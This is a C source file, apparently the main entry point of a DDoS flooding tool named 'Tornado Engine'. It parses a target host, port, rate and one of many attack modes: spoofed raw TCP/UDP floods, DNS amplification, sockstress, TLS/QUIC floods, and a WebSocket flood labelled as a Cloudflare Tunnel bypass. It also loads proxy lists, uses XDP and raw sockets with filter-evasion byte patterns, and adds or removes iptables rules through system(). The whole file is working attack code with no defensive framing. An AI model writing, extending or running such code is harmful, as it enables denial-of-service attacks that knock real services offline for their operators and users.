#include "types.h"
#include "network.h"
#include "proxy.h"
#include "attack.h"
#include "logger.h"

Arguments args;
Proxy *proxies = NULL;
int proxy_count = 0;
volatile int global_active_conns = 0;
volatile int global_proxy_active_conns = 0;
unsigned char *global_buffer_pool = NULL;
ThreadStats thread_stats[MAX_THREADS];
pthread_t thread_ids[MAX_THREADS];
int open_ports[64];
int num_open_ports = 0;
SSL_CTX *ssl_ctx = NULL;
unsigned char *payload_pool[PAYLOAD_CACHE_COUNT];

BypassPattern bypass_patterns[] = {
    {{0xc0, 0xaf}, 2}, {{0xe0, 0x80, 0xaf}, 3}, {{0xf0, 0x80, 0x80, 0xaf}, 4},
    {{0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65}, 11},
    {{0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00}, 8}, {{0x17, 0x00, 0x03, 0x2a}, 4},
    {{0x0d, 0x0a}, 2}, {{0x00}, 1}
};
int bypass_patterns_count = sizeof(bypass_patterns) / sizeof(BypassPattern);

static unsigned long long last_print_bytes = 0;
static long long last_print_time_ms = 0;

void print_stats() {
    unsigned long long p = 0, s = 0, f = 0, tcp = 0, rs = 0, se = 0, bytes = 0;
    int max_i = (args.threads < MAX_THREADS) ? args.threads : MAX_THREADS;
    for (int i = 0; i < max_i; i++) {
        p += thread_stats[i].packets; 
        s += thread_stats[i].connect_success; 
        f += thread_stats[i].connect_fail;
        tcp += thread_stats[i].tcp_packets;
        rs += thread_stats[i].raw_sent;
        se += thread_stats[i].send_errors;
        bytes += thread_stats[i].bytes;
    }
    long long now_ms = get_ms();
    double elapsed_sec = (last_print_time_ms > 0) ? (now_ms - last_print_time_ms) / 1000.0 : 1.0;
    if (elapsed_sec < 0.001) elapsed_sec = 1.0;
    double rate_mbps = ((bytes - last_print_bytes) * 8.0) / (elapsed_sec * 1000000.0);
    double total_mbits = (bytes * 8.0) / 1000000.0;
    last_print_bytes = bytes;
    last_print_time_ms = now_ms;
    if ((args.is_hybrid_v15 && proxy_count <= 0) || args.is_raw_tcp || args.is_raw_udp || args.is_v16_dns_amp || args.is_v18_quic || args.is_v18_tls) {
        LOG_INFO("STATS | Packets: %llu (TCP: %llu) | Raw: %llu | Err: %llu | %.1f Mbps (%.1f Mbits total)", p, tcp, rs, se, rate_mbps, total_mbits);
    } else {
        LOG_INFO("STATS | Packets: %llu (TCP: %llu) | OK: %llu | Fail: %llu | %.1f Mbps (%.1f Mbits total)", p, tcp, s, f, rate_mbps, total_mbits);
    }
}

void handle_sigint(int sig) {
    if (!args.is_dry_run && args.xdp_interface[0] != '\0') {
        unload_xdp_filter(args.xdp_interface);
        if (args.is_hybrid_v15 || args.is_raw_tcp || args.is_raw_udp) {
            disable_rst_drop(args.xdp_interface);
        }
    }
    if (args.is_v17_tcp_bypass || args.is_v18_tcp || args.is_v18_tls) {
        char rst_cmd[512];
        snprintf(rst_cmd, sizeof(rst_cmd),
            "iptables -D OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null",
            args.target_ip);
        system(rst_cmd);
        system("iptables -t raw -D OUTPUT -p tcp -j NOTRACK 2>/dev/null");
        system("iptables -t raw -D PREROUTING -p tcp -j NOTRACK 2>/dev/null");
    }
    print_stats();
    exit(0);
}


int main(int argc, char *argv[]) {
    if (argc < 4) {
        LOG_ERR("Usage: %s <host> <port> <rate> [time] [mode] [threads]", argv[0]);
        return 1;
    }
    memset(&args, 0, sizeof(args));
    strncpy(args.host, argv[1], sizeof(args.host) - 1);
    args.host[sizeof(args.host) - 1] = '\0';
    args.port = atoi(argv[2]);
    args.rate = atoi(argv[3]);
    args.duration = (argc > 4) ? atoi(argv[4]) : 3600;
    strncpy(args.mode, (argc > 5) ? argv[5] : "tornado", sizeof(args.mode) - 1);
    args.mode[sizeof(args.mode) - 1] = '\0';
    args.threads = (argc > 6) ? atoi(argv[6]) : 1;

    if (strstr(args.mode, "tornado")) args.is_tornado = 1;
    if (strstr(args.mode, "half")) args.is_half_open = 1;
    if (strstr(args.mode, "killer")) args.is_v3_killer = 1;
    if (strstr(args.mode, "crash")) args.is_crash_mode = 1;
    if (strstr(args.mode, "killer_v4")) args.is_v4_nightmare = 1;
    if (strstr(args.mode, "rapid_v5")) args.is_v5_rapid = 1;
    if (strstr(args.mode, "void_v6")) args.is_v6_void = 1;
    if (strstr(args.mode, "pipe_v7")) args.is_v7_pipe = 1;
    if (strstr(args.mode, "phantom_v8")) args.is_v8_phantom = 1;
    if (strstr(args.mode, "hydra_v9")) args.is_v9_hydra = 1;
    if (strstr(args.mode, "persist_v10")) args.is_v10_persist = 1;
    if (strstr(args.mode, "chaos_v11")) args.is_v11_chaos = 1;
    if (strstr(args.mode, "eclipse_v12")) args.is_v12_eclipse = 1;
    if (strstr(args.mode, "shadow_v13")) args.is_v13_shadow = 1;
    if (strstr(args.mode, "phantom_v14")) args.is_v14_phantom = 1;
    if (strstr(args.mode, "sockstress_v15")) {
        args.is_v15_raw_amp = 1;
    }
    if (strstr(args.mode, "raw_tcp")) args.is_raw_tcp = 1;
    if (strstr(args.mode, "raw_udp")) args.is_raw_udp = 1;
    if (strcmp(args.mode, "raw_tcp_spoof") == 0) args.is_raw_tcp_spoof = 1;
    if (strcmp(args.mode, "raw_udp_spoof") == 0) args.is_raw_udp_spoof = 1;
    if (strstr(args.mode, "dns_v16")) args.is_v16_dns_amp = 1;
    if (strstr(args.mode, "tcp_v17") || strstr(args.mode, "v17")) args.is_v17_tcp_bypass = 1;
    if (strstr(args.mode, "quic_v18")) args.is_v18_quic = 1;
    if (strstr(args.mode, "tls_v18") || strstr(args.mode, "v18_tls") || strstr(args.mode, "tls")) { args.is_v18_tls = 1; args.is_v17_tcp_bypass = 1; } // TLS uses V17 3WHS engine
    if (strstr(args.mode, "v18_tcp")) { args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // Pure TCP: 3WHS engine, no TLS
    if (strstr(args.mode, "stealth")) { args.is_stealth = 1; args.is_v18_tcp = 1; args.is_v17_tcp_bypass = 1; } // AF_PACKET raw engine
    if (strstr(args.mode, "v20_ws")) { args.is_v20_ws = 1; } // WebSocket L7 flood (CF Tunnel bypass)
    if (strstr(args.mode, "v19_tcp")) { args.is_v19_tcp = 1; args.is_v15_raw_amp = 1; }
    if (strcmp(args.mode, "raw_hybrid_v15") == 0) args.is_hybrid_v15 = 1;
    if (strstr(args.mode, "xdp_filter")) args.is_xdp_filter = 1;

    fprintf(stderr, "PARSE_DEBUG: mode=[%s] v17=%d v18tls=%d v16=%d v18q=%d\n", args.mode, args.is_v17_tcp_bypass, args.is_v18_tls, args.is_v16_dns_amp, args.is_v18_quic);

    resolve_host(args.host, args.target_ip);
    apply_optimizations();
    int use_proxies = 1;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-proxies") == 0) {
            use_proxies = 0;
        }
        if (strcmp(argv[i], "--dry-run") == 0) {
            args.is_dry_run = 1;
        }
    }
    if (args.is_dry_run) {
        LOG_INFO("Running in DRY-RUN mode. Bypassing network interface, XDP loading, and network socket traffic.");
    }
    if (use_proxies) {
        load_proxies("proxies.txt");
    } else {
        LOG_INFO("Bypassing proxies.txt as requested by --no-proxies");
    }

    if (!args.is_dry_run && (args.is_hybrid_v15 || args.is_raw_udp || args.is_raw_tcp || args.is_v16_dns_amp || args.is_v18_quic || args.is_v18_tls)) {
        if (get_default_interface(args.xdp_interface, sizeof(args.xdp_interface)) == 0) {
            LOG_INFO("Detected active network interface: %s", args.xdp_interface);
            
            if (args.is_hybrid_v15) {
                load_xdp_filter(args.xdp_interface, "xdp_v15_hybrid.o");
            } else if (args.is_raw_tcp && !args.is_raw_tcp_spoof) {
                load_xdp_filter(args.xdp_interface, "xdp_rst_filter.o");
            }

            // Configure XDP BPF map with target info for XDP_TX packet generation
            unsigned int src_ip = get_local_ip();
            if (src_ip != 0 && args.is_raw_tcp) {
                configure_xdp_target(args.xdp_interface, args.target_ip, args.port, src_ip);
            }
            LOG_INFO("TX mode: AF_INET raw socket (No Spoofing) + XDP_TX kernel generator");
        } else {
            LOG_ERR("Could not detect active network interface for XDP.");
        }
    }
    
    // if (args.is_v12_eclipse || args.is_v13_shadow || args.is_v14_phantom || args.is_v3_killer || args.is_crash_mode || args.is_v4_nightmare || args.is_v5_rapid || args.is_v6_void || args.is_v7_pipe || args.is_v8_phantom || args.is_v9_hydra || args.is_v10_persist || args.is_v17_tcp_bypass || args.is_v18_tls) {
    //     auto_port_scan();
    // }
    
    if (args.is_v12_eclipse) generate_heavy_payloads();
    
    global_buffer_pool = malloc(BUFFER_POOL_SIZE);
    xorshift_init((unsigned int)time(NULL) ^ 0xDEADBEEF);
    for (int i = 0; i < BUFFER_POOL_SIZE; i += 4) {
        unsigned int r = fast_rand();
        memcpy(global_buffer_pool + i, &r, (i + 4 <= BUFFER_POOL_SIZE) ? 4 : BUFFER_POOL_SIZE - i);
    }

    memset(thread_stats, 0, sizeof(thread_stats));
    signal(SIGINT, handle_sigint);
    signal(SIGPIPE, SIG_IGN); // Prevent process from being killed when writing to broken pipe/socket
    LOG_INFO("Tornado Engine V3 Starting: %s:%d | Mode: %s", args.host, args.port, args.mode);

    if (!args.is_dry_run && (args.is_hybrid_v15 || args.is_raw_tcp || args.is_raw_udp || args.is_v18_quic || args.is_v18_tls)) {
        if (args.xdp_interface[0] != '\0') {
            enable_rst_drop(args.xdp_interface);
        }
    }
    // V18 TLS TCP connection mode: limit threads
    if (args.is_v18_tls) {
        int max_tcp_threads = 512;
        if (args.threads > max_tcp_threads) {
            LOG_INFO("TCP mode: threads %d -> %d (each manages %d conns for total %d)",
                     args.threads, max_tcp_threads, args.rate / max_tcp_threads, args.rate);
            args.threads = max_tcp_threads;
        }
    }

    // Set 512KB stack per thread (default 8MB × 1500 = 12GB = crash)
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 2 * 1024 * 1024);
    
    for (int i = 0; i < args.threads && i < MAX_THREADS; i++) {
        int *t = malloc(sizeof(int)); *t = i;
        pthread_create(&thread_ids[i], &attr, worker_thread, t);
    }
    pthread_attr_destroy(&attr);
    
    LOG_INFO("DEBUG: is_v18_tls=%d, is_v18_quic=%d, is_v17_tcp_bypass=%d, af_xdp_active=%d", 
             args.is_v18_tls, args.is_v18_quic, args.is_v17_tcp_bypass, args.xdp_interface[0] != '\0');

    // Periodic stats and exact duration check using real wall-clock time
    long long start_time = get_ms();
    long long last_print = start_time;
    
    while (1) {
        sleep(1);
        long long now = get_ms();
        
        if (args.duration > 0 && (now - start_time) / 1000 >= args.duration) {
            LOG_INFO("Time is up! Forcefully exiting process to stop attack instantly.");
            exit(0); // KILL EVERYTHING IMMEDIAELY, NO DEADLOCKS
        }
        
        if (now - last_print >= 1000) {
            print_stats();
            last_print = now;
        }
    }

    return 0;
}
